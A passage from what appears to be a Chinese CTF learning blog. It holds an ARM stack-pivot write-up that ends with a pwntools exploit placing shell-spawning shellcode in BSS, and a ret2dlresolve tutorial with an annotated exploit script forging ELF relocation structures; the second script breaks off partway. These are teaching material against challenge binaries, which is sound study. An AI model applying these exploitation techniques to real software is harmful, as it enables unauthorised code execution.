alt=""></p><p>存在溢出点，但是可溢出的字节很少，因此考虑栈迁移。且没有后门函数</p><p><strong>这道题我有的地方写的是R11（是因为IDA上看是R11），有的地方写的fp（因为gdb里看的是fp)，实际上这俩就是一个东西。</strong></p><h2 id="大致思路：">大致思路：</h2><p>栈迁移的话，考虑迁移到BSS段，同时观察汇编，发现read的第二个参数（即输入的地址）是由R3传递的，而R3的值是由R11来传递的</p><p><img src="../img/2706180-20220330144030365-98591889.png" alt=""></p><p>同时在最后，又有一个pop指令来控制R11和PC，因此我们是可以控制R11（也就是read的第二个参数)和程序执行流的（PC）</p><p><img src="../img/2706180-20220330144038604-1618653163.png" alt=""></p><p>经过调试发现，这个fp距离我们输入起始的地址偏移为100,这就意味着我们需要填充100个垃圾数据，然后来控制fp以及pc。</p><p>因此第一次输入的时候，控制fp，让其为bss段地址（迁移的时候bss段尽量抬高），然后将返回地址read地址，再跑一次，让我们的第二次payload输入到bss段。</p><p><strong>arm架构（32位）的bss段是可执行的，尽管用vmmap看的是可写不可执行（但是布置进去的shellcode确实可以执行）</strong></p><p>因此我们就要把shellcode布置在bss段。这道题是十分锻炼自主的调试能力的，可以看见我的exp是在shellcode前面布置了两个内容，这里我并不想解释原因。最开始我自己做这道题的时候并没有写这两个内容，当时我认为直接把bss段写shellcode就行，然后控制PC指针执行过去，<strong>事实上这样做是错误的</strong>。原因请自主调试，这里考察了自主调试来布局payload（如果你可以眼睛看出来payload整体布局的话，当我什么都没说），如果连这里到最后都不理解而且还稀里糊涂的交了flag的话，那做这道题是毫无意义的。</p><p>大致思路就是这样（第二次输入布置shellcode，然后控制PC寄存器，将其指向shellcode的位置）剩下的具体细节真的没有办法记录，因为剩下的布局都是一点一点调试出来的。</p><h2 id="关于对调试能力的总结：">关于对调试能力的总结：</h2><p>我这里说一下我从刚开始学pwn，到现在也刚好是四个月了。总结了一下的调试经验（有可能在各位师傅面前算是班门弄斧了，但这依然是对这四个月所掌握的调试能力的一个记录）。</p><p>第一，你要时刻清楚你自己想要看的内容以及自己卡在了哪里</p><p>第二，在调试的过程中，遇到卡住的地方，要思考为什么会这样。</p><p>第三，在锻炼调试能力的时候，刚开始有的地方可能不知道卡住的原因是什么，建议找一份可以打通（和你思路相近的）的exp，去调试一下，再反复对比自己exp的动态调试，这样很容易找到问题。</p><p>第四，就是可能你认为你的思路很对，但就是打不通，而别人的思路都和你的不一样，<strong>由衷建议，不要放弃你的思路，到最后无非是两种可能，你通过坚持以及思考打通了自己的exp，又或者是你通过反复调试，最后发现自己的思路是错误的，不可行的。但其实不论结果，这个坚持的过程已经让你的调试能力有了不小的进步。</strong></p><h2 id="EXP-v2">EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26705)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;./armup_buu&quot;])</span></span><br><span class="line">p=process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./armup_buu&quot;</span>])</span><br><span class="line">e=ELF(<span class="string">&#x27;./armup_buu&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x21000</span>+<span class="number">0x600</span></span><br><span class="line">read_addr=<span class="number">0x0001052C</span></span><br><span class="line">offset=<span class="number">100</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">payload=offset*<span class="string">&#x27;a&#x27;</span>+p32(bss_addr+<span class="number">0x68</span>)+p32(read_addr)<span class="comment">#因为sub减去了0x68，所以这里提前加上0x68</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">shellcode=p32(<span class="number">0</span>)+p32(bss_addr+<span class="number">8</span>)+asm(shellcraft.sh())</span><br><span class="line">payload=shellcode</span><br><span class="line">payload=payload.ljust(<span class="number">0x64</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)+p32(<span class="number">0x10548</span>)<span class="comment">#bss_addr+4是将sp设置成bss_addr（不过这一步只是将参数给R11，将sp赋值是下面的操作）    将pc设置为0x10548的目的是再执行一遍 SUB     SP, R11     POP     &#123;R11,PC&#125;</span></span><br><span class="line"><span class="comment">#这样来修改sp的值，如果不修改sp的值的话，执行shellcode的时候，有个指令会将栈里（此时是bss段）的值修改，从而导致shellcode执行失败。</span></span><br><span class="line"><span class="comment">#上述的内容用一句话说就是，要将栈迁移到执行流的地方。不然shellcode会把自身给破坏了... 要是不相信的话，可以不要这两个指令，然后调试一下，就明白咋回事了</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARM架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于ret2_dl_runtime_resolve的学习总结</title>
      <link href="/posts/ba418f23.html"/>
      <url>/posts/ba418f23.html</url>
      
        <content type="html"><![CDATA[<p>这篇文章也算是集百家之长了，因为在学习ret2dlresolve这个高级rop的时候，师傅们可能都是因为实力比较强，因而在一些细节的地方没有解释为什么，如此在学习的时候，还是稍微有点吃力的，学习了很多位师傅的博客之后加上自己的一些思考才写出了这篇博客（我认为写的比较好的博客链接都放到文章最后了，我有的小细节可能忘记提到了，可以去这些师傅的博客上面看一下），也算是站在巨人的肩膀上学习了。</p><p>在学习ret2dlresolve的时候，我建议先把_dl_runtime_resolve函数的运作流程搞透彻了再去做题，效果会好很多，不然直接上题的话，根本就不懂原理是怎么搞的。</p><p>需要的前置知识：1、对延迟绑定机制的整体流程较为熟悉  2、对栈迁移的知识要比较熟悉  3、做题的时候，可能会遇见很多小细节问题，因此要具备gdb调试能力  4、如果可以的话，最好参考着glibc源码一起学习这部分内容（就是遇见不会的问题，可以从源码上下手试试），尽管我已经出示了用到的结构的源码，但我建议最好你的手里也有一份glibc源码  5、由于刚开始理解会异常的费劲，可能会需要几天才能理解透彻，所以学习这部分的内容还需要有一份耐心</p><h1>延迟绑定整体流程图</h1><p>下面我主要解释_dl_runtime_resolve这个函数运作时的情况，而延迟绑定的整体流程我就不详细说明了，具体的流程可以参考下面这个流程图（这个我也忘记是哪个师傅做的了，很久之前收藏了这个图片）</p><p><img src="../img/2706180-20220228094538432-2125281617.png" alt=""></p><p>而Linux中最终完成动态链接的函数进行重定位的是在_dl_runtime_resolve(link_map_obj, reloc_index)函数中完成的，如果再详细一点就是_dl_runtime_reslove函数调用了_dl_fixup函数，然后_dl_fixup函数调用了_dl_lookup_symbol_x函数，最终这个函数去动态库里面找到了我们此刻进行延迟绑定的函数，并且把它的地址填写到了got.plt表项中。这里主要详细讲一下_dl_runtime_resolve函数的运作流程</p><h1>_dl_runtime_reslove函数的运作流程</h1><p>这个函数运行的大致流程如下，<strong>流程不理解也没关系，先结合着我写的流程跟着一起做就可以了</strong>，做完之后肯定就会有点思路了，这时候就可以进行一些思考了。<strong>下面这三个段</strong>，我建议先大概看一下，<strong>不用彻底弄懂</strong>，然后开始跟着我的流程分析，<strong>等遇到这个段的时候，再拐回来看，效果会比较好。</strong></p><h3 id="dynamic段">.dynamic段</h3><p><u>.dynamic段里面保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象，动态链接符号表的位置（Dynamic Symbol Table)、动态链接重定位表的位置、动态链接字符串表的位置(Dynamic String Table)</u>。也就是说**比如现在想找到Dynamic Symbol Table，就必须先找到.dynamic的地址，才可以去找到Dynamic Symbol Table，因此这个段主要用于寻找与动态链接相关的其他段( .dynsym .dynstr .rela.plt 等段)。**下面是Elf32_Dyn的结构，它由一个类型值即d_tag和一个数值或指针（union是一个联合体，同时定义了一个数值d_val和一个指针d_ptr，但是一次只能存储一个值，因此这个联合体的大小为4字节，而整个结构体Elf32_Dyn为8字节，这个结构以及结构的大小会在一会查看Dynamic Symbols Table和Dynamic String Table的时候派上用场）。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword  d_tag;       <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;          <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;          <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><h3 id="动态符号表（Dynamic-Symbol-Table">动态符号表（Dynamic Symbol Table)</h3><p>动态符号表中存储了与动态链接相关的符号，而这个段的段名通常叫做“.dynsym&quot;，而对于本模块的内部符号或者私有变量则保存在.symtab这个表，symtab保存了所有的符号，包括.dynsym中的符号。</p><p>使用readelf -s 文件名  则可以查看文件中的.dynsym和symtab（如下面两张图片）</p><p><img src="../img/2706180-20220228094602392-459952878.png" alt=""></p><p><img src="../img/2706180-20220228094611847-731147180.png" alt=""></p><h3 id="动态符号字符串表（Dynamic-String-Table">动态符号字符串表（Dynamic String Table)</h3><p>跟名字一样，这个表就是保存了符号名的字符串表。而这个表存在的意义是由于Dynamic Symbol Table里记录的都是固定长度的内容，因此它们没办法去描述二进制文件中的任意字符串（也就是我们的函数名称），因此就需要再创立一个表（也就是.dynstr)来存储函数名称的字符串，在.dynsym中的.st_name字段存储了一个偏移，而最后.dynstr段的首地址加上这个偏移量才能找到符号的名称。而_dl_lookup函数最后就是拿着这个符号的名称（也就是函数的名称）去动态链接库里面搜索对应的函数。</p><p>在IDA中可以找到这个ELF String Table</p><p><img src="../img/2706180-20220228094622567-442690588.png" alt=""></p><h2 id="dl-runtime-resolve函数具体运行模式">_dl_runtime_resolve函数具体运行模式</h2><ol><li><p>首先用<code>link_map</code>（就是_dl_runtime_resolvehand的第一个参数）访问<code>.dynamic</code>，分别取出<code>.dynstr</code>、<code>.dynsym</code>、<code>.rel.plt</code>的地址</p></li><li><p><code>.rel.plt</code>+参数<code>relic_index</code>，求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></p></li><li><p><code>rel-&gt;r_info</code> &gt;&gt; <code>8</code> 作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></p></li><li><p><code>.dynstr</code> + <code>sym-&gt;st_name</code>得出符号名 字符串指针</p></li><li><p>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即<code>GOT</code>表</p></li><li><p>最后调用这个函数</p></li></ol><p>这里我以scanf函数的调用来演示一下（随便找个程序就可以一起做了）</p><p>此时即将调用scanf，我们进入内部看一下</p><p><img src="../img/2706180-20220228094633543-1760861108.png" alt=""></p><p>发现刚进去，就要让跳到0x0804a028所指向的地址（注意这里并不是跳到0x0804a028，而是跳到0x0804a028所指向的地址），我们先看一下0x0804a028指向的哪</p><p><img src="../img/2706180-20220228094641752-2061093355.png" alt=""></p><p>发现指向的就是下一条指令的地址，这也就顺应了延迟绑定的流程图中的步骤②</p><p><img src="../img/2706180-20220228094649241-866430968.png" alt=""></p><p>也可以发现此时的got表中scanf的地址写的就是0x080484b6，而这并不是scanf函数的真实地址。<br><img src="../img/2706180-20220228094656078-12744920.png" alt=""></p><p>然后发现push了一个0x38，此时我们还不知道这是什么，先不管它。</p><p>发现此时准备跳转到地址0x8048430，然后跳到0x08048430，<strong>其实此时你会注意到这个地址距离当前指令的地址是很近的（再看下延迟绑定的流程图会发现其实现在就是步骤④）</strong>，然后接下来是一个push，一个jmp，我们分别看下push和jmp的内容</p><p><img src="../img/2706180-20220228094703865-691204009.png" alt=""></p><p>可以发现push的是一个地址，而jmp则是跳到了_dl_runtime_resolve（此时完成的是延迟绑定流程图的步骤⑥）</p><p><img src="../img/2706180-20220228094710868-1046942444.png" alt=""></p><p><img src="../img/2706180-20220228094718808-1062991369.png" alt=""></p><p>此时才发现，准备跳到_dl_runtime_resolve的时候，之前压栈的两个原来是参数，因此栈顶的这个地址0xf7ffd940就是参数link_map，而0x38则是参数reloc_index。</p><p><img src="../img/2706180-20220228094727908-1299586145.png" alt=""></p><p>因此我们先通过link_map去找到.dynamic的地址，这里第三个地址就是.dynamic的地址，不过为什么是第三个地址，而不能是别的地址？（参考下面的解释，怎么用怎么用link_map访问到.dynamic的地址的？）<br><img src="../img/2706180-20220228094734973-1296358547.png" alt=""></p><h3 id="怎么用link-map访问到-dynamic的地址的？">怎么用link_map访问到.dynamic的地址的？</h3><p>link_map的源码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;    <span class="comment">/* Base address shared object is loaded at.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;     <span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;      <span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以发现在第三个成员 *l_ld这里存储的是Dynamic段地址，因此我们去查找link_map结构体中第三个的地址就是.dynamic的地址了</p><p>现在要分别取出<code>.dynstr</code>、<code>.dynsym</code>、<code>.rel.plt</code>的地址了，它们处于什么位置？</p><p>我们先用readelf -d 看一下.dynamic段的内容</p><p><img src="../img/2706180-20220228094743012-658911024.png" alt=""></p><p><strong>发现了.dynstr、.dynsym和rel.plt的位置，分别是位于了偏移9，偏移10，和偏移17的位置，又结合最前面提到的结构体Elf32_Dyn为8字节，并且实际的值或者指针应该处于后四字节，因此他们应该分别在dynamic段中位于8*9-4=0x44，10*8-4=0x4c,17*8-4=0x84偏移处</strong>（这里要减去4字节是因为我计算的是不包括他们身处当前位置的字节，而前面计算偏移9、10、17的时候，包括了他们身处当前位置的偏移）因此这里去看下.dynamic段的内容，然后取出对应偏移的内容就是我们要找的.dynstr、dynsym、rel.plt。</p><p><img src="../img/2706180-20220228094750474-266299948.png" alt=""></p><p>然后用rel.plt的值加上参数reloc_index，就是重定位表项Elf32_Rel的指针，即0x080483c4+0x38=0x80483fc。</p><p><img src="../img/2706180-20220228094758713-328537999.png" alt=""></p><p>下面是Elf32_Rel的结构，对应上图来看，因此r_offset=0x804A028**（而这个r_offset就是got.plt的地址，<font color=red>就是说最后解析之后真实的地址会填写进r_offset所指向的地方）</font>**,r_info=0x907。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr   r_offset;     <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word   r_info;          <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p>而将r_info&gt;&gt;8作为dynsym的下标，即0x907&gt;&gt;8=9</p><p><img src="../img/2706180-20220228094808547-1115623759.png" alt=""></p><p>此时它的地址为0x08048268，我们看下Elf32_Sym的源码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p>发现在第一个成员st_name存储的就是字符串表的索引（这里我感觉理解成偏移更合适），也就是说符号表的一个内容存储的就是.dynstr距离所需要函数名称的偏移。</p><p>那我们看一下0x08048268地址的内容，发现了偏移是0x1a<br><img src="../img/2706180-20220228094819076-1553870020.png" alt=""></p><p>因此最终的st_name的地址为.dynstr的地址加上之前拿到的.dynstr的索引，即0x080482a8+0x1a=0x080482c2,</p><p>最终也是成功找到.dynstr中的scanf函数名字的存储地址。<br><img src="../img/2706180-20220228094826126-1150418789.png" alt=""></p><p>接下来就会调用_dl_lookup_symbol_x函数，去动态库里进行遍历搜索，可以看见下图的第一个参数就是我们要搜索的函数名称</p><p><img src="../img/2706180-20220228094834270-1905443385.png" alt=""></p><h2 id="倒推整个过程，增强整体的逻辑性">倒推整个过程，增强整体的逻辑性</h2><p>然后上面说明的是具体的实现过程，但是彼此因果性可能不是特别强，下面我再倒推一遍，目的是为了让你知道每一步都在干什么。</p><p><strong>我们需要拿到我们要找的函数名字（它是个字符串，而我们要拿到这个字符串的首地址），然后把它交给_dl_lookup_symbol_x,让这个函数去动态库里面搜索，找到我们想延迟绑定的函数，然后把地址再填写到got.plt里面</strong></p><p>那现在唯一的问题就是我们怎么拿到这个函数的名字的字符串？<br><strong>这个字符串放在.dynstr（动态符号字符串表）了里面，那我们现在需要两个东西，<font color=red>一个是.dynstr的首地址，一个是我们所需要的字符串距离.dynstr首地址的偏移</font>，才能准确的去找到我们需要的函数名字</strong></p><p>那现在的问题就是这两个东西怎么找？</p><h3 id="①先说-dynstr的首地址"><strong>①先说.dynstr的首地址</strong></h3><p><strong>在.dynamic段里存储了动态链接器所需要的基本信息，而这其中就包含了.dynstr的位置</strong>，也就是说如果现在找到了.dynamic的地址，查看里面的内容即可找到.dynstr的位置<br>那现在的问题就是去找.dynamic的地址。<br>而观察了link_map的结构，<strong>发现link_map结构体中第三个内容存放的就是.dynamic的地址</strong><br>因此我们只需要去查看一下link_map的内容，然后第三个内容就是我们要找的东西了，<strong>而link_map我们是知道的，因为它就是执行_dl_runtime_resolve函数时的第一个参数link_map_obj。</strong><br>如此再推回去，就可以知道.dynstr的地址了</p><h3 id="②再说一下相对于-dynstr首地址的偏移怎么找"><strong>②再说一下相对于.dynstr首地址的偏移怎么找</strong></h3><p>通过阅读<strong>Elf32_Sym</strong>的源码，发现<strong>它这个结构体中第一个成员存储的就是我们要找的偏移</strong><br>而<strong>这个结构又存储在.dynsym（动态符号表）中</strong>（每个函数都有一个自己单独的Elf32_Sym结构）<br>因此<strong>我们可以在.dynsym中找到我们想要的Elf32_Sym结构</strong>，可是又出现了两个问题。<br><strong><font color=red>每个函数都有一个这个结构，那我们怎么去.dynsym中找到我们要找的这个函数的结构？并且.dynsym的地址怎么找？</font></strong></p><h4 id="先解决第二个问题">先解决第二个问题</h4><p><strong>.dynsym的地址也在上面提到的.dynamic段中存储了</strong>，而上面我们已经说了怎么找.dynamic段的地址，因此这个.dynsym的地址已经被我们知道了</p><h4 id="然后解决第一个问题，我们怎么在-dynsym中找到我们要找的那个函数的结构？">然后解决第一个问题，我们怎么在.dynsym中找到我们要找的那个函数的结构？</h4><p><strong>找到这个结构其实也只是需要拿到它距离.dynsym首地址的偏移即可，而这个偏移需要去找到rel.plt表</strong>，这个表是由Elf32_Rel结构体组成，而<strong>将它的第二个成员存储的内容算术右移八位，得到的数值就是我们要找的结构距离.dynsym的偏移</strong><br>现在的问题又是要去找rel.plt表，不过好在<strong>rel.plt也位于.dynamic段</strong>，<strong><font color=red>由于每个Elf32_Rel的结构体又都对应一个函数，因此怎么去找到我们需要的那个Elf32_Rel呢？</font></strong><br>又要用到偏移，而这个偏移我们不需要找了，因为<strong>这个偏移就是_dl_runtime_resolve的第二个参数reloc_index</strong>，如此推回去，也就知道了我们需要的.dynstr首地址的偏移了。</p><h2 id="dl-runtime-resolve函数运作的流程图">_dl_runtime_resolve函数运作的流程图</h2><p>把上面的倒推过程画成图就是这个样子。<br><img src="../img/2706180-20220228094846054-1801078117.png" alt=""></p><h1>漏洞所在</h1><p>通过阅读上面的所有内容，其实是可以发现，最后**_dl_lookup_symbol_x<strong>函数会去搜索字符串是有问题的，因为这个函数</strong>并不在乎你给的字符串是否是你此刻在延迟绑定的函数**，即使这个字符串是别的函数的名称，它依旧会去搜索，<strong>并且动态装载器并不会去检查重定位表的边界，即使你的_dl_runtime_resolve函数第二个参数是极大的，此时的偏移已经超过了rel,plt段的范围</strong>，装载器也依旧是认为这只是一个很大的rel.plt偏移，它不认为这个偏移超过了rel.plt段，最重要的就是<strong>32位程序里面，是用的栈传参，因此这就意味着_dl_runtime_resolve的第二个参数是可以被伪造的</strong>，综上所述，<font color=red>我们就可以伪造一个很大的 reloc_index,让原本偏移到rel.plt段的reloc_index偏移到我们伪造的可控内存，然后我们就可以伪造一系列的结构，最终让距离dynstr段首的偏移指向我们指定的字符串（也就是伪造了字符串），至此_dl_lookup_symbol函数就去搜索到了我们指定的函数。</font></p><h1>实战ret2dlresolve</h1><h2 id="手动构造exp探究原理">手动构造exp探究原理</h2><p>我感觉ret2dlresolve的情况只适用于没有打印函数的程序，毕竟有了打印函数就可以直接用ret2libc了，因此这里我以只有一个read函数的题目来演示一下</p><p><img src="../img/2706180-20220228094854685-707283332.png" alt=""></p><p><img src="../img/2706180-20220228094901516-535707583.png" alt=""></p><p>发现只有一个read函数，然后存在溢出，然后就啥都没有了，没有system函数，没有参数。像这种情况就考虑ret2dlresolve的方法了。</p><p>接下来我直接就上exp了，详细解释都在exp里面。（里面有的要用到图片解释的地方，我有进行标注，请参考最下面的补充内容）<br>题目我上传到网盘上了 链接https://pan.baidu.com/s/178HKNE9slZspt7EIB81zoA?pwd=ykpa  提取码ykpa</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt0 = e.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = e.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = e.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = e.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#先初始化一下一会要用到的段首地址，就是把每个段的首地址都给赋值给变量</span></span><br><span class="line"><span class="comment">#当然了，你要是想去ida里面一个一个手动找出来，也完全没问题</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset=<span class="number">44</span><span class="comment">#这个偏移没啥好说的了，ida或者gdb都能得到</span></span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">four_pop_ret=<span class="number">0x080485d8</span><span class="comment">#这里采用的是连续pop四次的gadget地址</span></span><br><span class="line">leave_ret_addr=<span class="number">0x0804854A</span></span><br><span class="line">base_addr=<span class="number">0x0804a800</span></span><br><span class="line"><span class="comment">#这个base_addr是我们要把栈迁移的地方，用gdb发现这一部分是可写的</span></span><br><span class="line"><span class="comment">#因此我们选择迁移到这里（具体参考补充①）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr=base_addr+<span class="number">32</span><span class="comment">#这个fake_sym_addr是Elf32_Sym结构的首地址</span></span><br><span class="line"><span class="comment">#原本是要把伪造的ELf32_Sym结构写在偏移32的位置的，但是还要对齐，因此下面还要再加align</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>)<span class="comment">#Elf32_Sym结构是16字节，因此地址也需要和16字节对齐，二者地址相减</span></span><br><span class="line"><span class="comment">#然后只取最后一位，就可以理解成二者的地址是放在了一个结构里面</span></span><br><span class="line"><span class="comment">#（因为只考虑最后一位的话范围只是在16字节以内（但其实不是这样的，不过可以理解成这样，画个图就懂了）</span></span><br><span class="line"><span class="comment">#然后最后的值被0x10所减，求的就是fake_sym_addr距离16个字节所补齐差的字节数</span></span><br><span class="line"><span class="comment">#至于为什么减的是dynsym，淦，因为dynsym一定是被对齐了的，因此它需要找一个对齐的表来做参考啊</span></span><br><span class="line">fake_sym_addr+=align<span class="comment">#最后再加上这个为了补齐的字节才是最后我们要构造的fake_sym的地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">st_name=fake_sym_addr+<span class="number">0x10</span>-dynstr<span class="comment">#这个st_name就是dynstr段首地址距离目标函数名称的偏移</span></span><br><span class="line"><span class="comment">#我们把最终的system函数名称布置到了fake_sym_addr+0x10的位置，为啥加0x10?</span></span><br><span class="line"><span class="comment">#因为system上面还有一个Elf32_Sym的结构，这个结构大小为16字节</span></span><br><span class="line">st_info=<span class="number">12</span><span class="comment">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type（不过我感觉没必要区分，直接加起来就行）</span></span><br><span class="line"><span class="comment">#另外就是这个12是可以在IDA里面通过dynsym来查到（具体参考补充②）</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info)<span class="comment">#这个就是伪造的Elf32_Sym结构</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r_offset=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#这个是ret.plt结构中的第一个成员，也就是解析之后的真实地址写入的地方</span></span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span><span class="comment">#这个我不是太确定，我感觉除0x10是因为Elf32_Sym的大小是16字节</span></span><br><span class="line"><span class="comment"># 这个偏移应该是以一个结构（16字节）为单位的</span></span><br><span class="line">r_type=<span class="number">0x7</span><span class="comment">#这个0x7是重定位的一种类型，指的是导入函数，进入_dl_fixup函数里面，还会检查这是不是0x7</span></span><br><span class="line">r_info=(<span class="built_in">int</span>(r_sym)&lt;&lt;<span class="number">8</span>)+(r_type&amp;<span class="number">0xf</span>)<span class="comment">#这里&lt;&lt;8是因为，最后还要再&gt;&gt;8，从而保持正常，而&amp;0xf，其实没用，不写也行</span></span><br><span class="line">reloc_index=base_addr-rel_plt+<span class="number">24</span><span class="comment">#从rel.plt到base_addr+24的偏移也就是执行_dl_runtime_resolve的第二个参数</span></span><br><span class="line"><span class="comment">#而加24的原因是，我们将rel.plt结构布置在了距离base_addr偏移24的位置</span></span><br><span class="line">fake_rel_plt=p32(r_offset)+p32(r_info)<span class="comment">#这里就是伪造的rel.plt结构</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=offset*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload1+=p32(read_plt_addr) <span class="comment">#劫持执行流，让程序再执行一次read，将我们想要伪造的内容存入我们指定的地方</span></span><br><span class="line">payload1+=p32(four_pop_ret) <span class="comment">#这里需要用连续四个pop把栈顶的内容给从栈顶清空，不然ret的时候就会出现问题</span></span><br><span class="line"><span class="comment">#这里采用四个pop的原因是因为如果采用三个pop的话，第三个pop是弹给了ebp，这样迁移的话就会出现问题，</span></span><br><span class="line"><span class="comment">#因此我用了四个pop前三个清空栈顶的参数，后一个pop去改变ebp的值，为了正常的完成栈迁移</span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(base_addr)</span><br><span class="line">payload1+=p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(base_addr-<span class="number">4</span><span class="comment">#这里如果用base_addr的时候，会出现问题，调试的时候发现dl_fixup的时候发现</span></span><br><span class="line"><span class="comment">#里面push了一个ecx，（这个ecx）被用来当做dl_fixup的参数（link_map)，这个ecx就是我们第二次输入的首地址</span></span><br><span class="line"><span class="comment">#如果首地址里面装了4个a的话，就会出现错误（因为参数link_map怎么能是4个a呢），通过调试发现，link_map本身正常的</span></span><br><span class="line"><span class="comment">#参数就是push了ds:0x0804a004(此时的栈已经迁移过了，调试发现压到的这个栈顶居然就是0x0804a800），因此为了让dl_fixup拿到</span></span><br><span class="line"><span class="comment">#这个正常的参数，我们就要让ecx是0x0804a800，而怎么让这个ecx变成0x0804a800，我们只能是read输入的第二个参数</span></span><br><span class="line"><span 